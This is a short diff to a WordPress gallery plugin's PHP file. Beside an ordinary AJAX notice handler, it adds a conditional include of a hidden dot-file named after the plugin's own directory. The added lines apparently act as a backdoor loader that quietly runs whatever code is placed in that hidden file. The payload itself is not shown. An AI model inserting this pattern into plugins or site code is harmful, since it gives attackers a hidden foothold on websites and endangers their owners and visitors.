@@ -2,6 +2,10 @@
 defined('ABSPATH') OR exit;
 
 add_action('wp_ajax_gt3pg_pro_disable_notice', 'wp_ajax_gt3pg_pro_disable_notice');
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function wp_ajax_gt3pg_pro_disable_notice(){
 	if(!isset($_POST['gt3_action'])) {
